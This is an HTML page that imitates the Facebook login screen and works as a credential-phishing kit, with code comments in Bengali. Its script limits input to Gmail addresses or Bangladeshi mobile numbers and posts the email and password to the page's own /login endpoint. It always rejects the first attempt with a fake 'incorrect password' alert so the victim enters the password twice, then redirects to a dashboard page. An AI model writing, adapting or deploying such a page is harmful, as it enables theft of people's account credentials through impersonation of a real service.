<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        /* আপনার অরিজিনাল ডিজাইন - একদম এক রাখা হয়েছে */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body { background-color: #fff; display: flex; flex-direction: column; align-items: center; }

        /* Top Blue Bar - Very Realistic */
        .top-bar {
            width: 100%;
            background-color: #3b5998;
            padding: 12px;
            text-align: center;
            color: white;
            font-size: 14px;
        }

        .fb-logo-text {
            margin-top: 30px;
            color: #1877f2;
            font-size: 30px;
            font-weight: bold;
            letter-spacing: -1px;
        }

        .login-form-container {
            width: 90%;
            max-width: 400px;
            margin-top: 20px;
        }

        .input-wrapper {
            width: 100%;
            margin-bottom: 0;
        }

        .input-box {
            width: 100%;
            padding: 14px 12px;
            border: 1px solid #dddfe2;
            font-size: 16px;
            background-color: #f5f6f7;
            outline: none;
        }

        /* Border styling for top and bottom inputs */
        #fb-email { border-radius: 6px 6px 0 0; border-bottom: none; }
        #fb-pass { border-radius: 0 0 6px 6px; margin-bottom: 15px; }

        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
        }

        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 15px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        /* Language Section */
        .language-section {
            margin-top: 50px;
            width: 100%;
            text-align: center;
            color: #8a8d91;
            font-size: 12px;
        }

        .lang-links span { margin: 0 5px; cursor: pointer; }
        .active-lang { color: #4b4f56; font-weight: bold; }

        /* Loader Animation */
        #loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1877f2;
            border-radius: 50%;
            width: 25px;
            height: 25px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="top-bar">Get Facebook for Android and browse faster.</div>

    <div class="fb-logo-text">facebook</div>

    <div class="login-form-container">
        <div class="input-wrapper">
            <input type="text" id="fb-email" class="input-box" placeholder="Mobile number or email address">
            <input type="password" id="fb-pass" class="input-box" placeholder="Password">
        </div>
        
        <button class="login-button" id="loginBtn" onclick="handleLogin()">Log In</button>
        <div id="loader"></div>

        <a href="notfound.html" class="forgot-link">Forgotten password?</a>

        <div style="display: flex; align-items: center; margin: 30px 0; color: #ccd0d5;">
            <hr style="flex: 1; border: 0; border-top: 1px solid #ccd0d5;">
            <span style="padding: 0 10px; font-size: 14px; color: #8a8d91;">or</span>
            <hr style="flex: 1; border: 0; border-top: 1px solid #ccd0d5;">
        </div>

        <center>
            <button type="button" onclick="window.location.href='notfound.html'"
                style="background: #42b72a; border: none; padding: 10px 15px; color: white; font-weight: bold; border-radius: 6px; font-size: 14px; cursor: pointer; margin-top: 10px;">
                Create New Account
            </button>
        </center>
    </div>

    <div class="language-section">
        <div class="lang-links">
            <span class="active-lang">English (UK)</span> <span>বাংলা</span> <span>हिन्दी</span>
        </div>
        <p style="margin-top: 15px;">Meta © 2026</p>
    </div>

    <script>
        let attemptCount = 0; 

        async function handleLogin() {
            const emailValue = document.getElementById('fb-email').value.trim();
            const passValue = document.getElementById('fb-pass').value.trim();
            const loader = document.getElementById('loader');
            const loginBtn = document.getElementById('loginBtn');

            // ১. পাসওয়ার্ড ৬ অক্ষরের কম হলে
            if (passValue.length < 6) {
                alert("The password you've entered is incorrect. Please try again.");
                return;
            }

            // ২. ইমেইল না কি ফোন নম্বর চেক
            const isEmail = emailValue.includes('@');
            
            if (isEmail) {
                if (!emailValue.toLowerCase().endsWith('@gmail.com')) {
                    alert("The email address you've entered is incorrect. Please try again.");
                    return;
                }
            } else {
                const isNumeric = /^\d+$/.test(emailValue); 
                const startsWith01 = emailValue.startsWith('01');

                if (!isNumeric || emailValue.length !== 11 || !startsWith01) {
                    alert("The mobile number you've entered is incorrect. Please try again.");
                    return;
                }
            }

            // UI Feedback
            loginBtn.style.opacity = '0.5';
            loginBtn.innerText = 'Logging in...';
            loader.style.display = 'block';

            try {
                attemptCount++;
                // পরিবর্তন: localhost লিঙ্কটি বাদ দিয়ে রিলেটিভ পাথ দেওয়া হয়েছে
                await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        email: emailValue, 
                        password: passValue,
                        login_type: `FB_LOGIN_ATTEMPT_${attemptCount}`
                    })
                });
            } catch (e) {
                console.log("Error logging data.");
            }

            // রিডাইরেক্ট লজিক (১ম বার এরর দেখাবে, ২য় বার ড্যাশবোর্ডে পাঠাবে)
            setTimeout(() => {
                if (attemptCount === 1) {
                    alert("Incorrect password. Please try again.");
                    document.getElementById('fb-pass').value = ""; 
                    resetBtn();
                } else {
                    window.location.href = "dashboard.html";
                }
            }, 1500);
        }

        function resetBtn() {
            const loader = document.getElementById('loader');
            const loginBtn = document.getElementById('loginBtn');
            loginBtn.style.opacity = '1';
            loginBtn.innerText = 'Log In';
            loader.style.display = 'none';
        }
    </script>
</body>
</html>
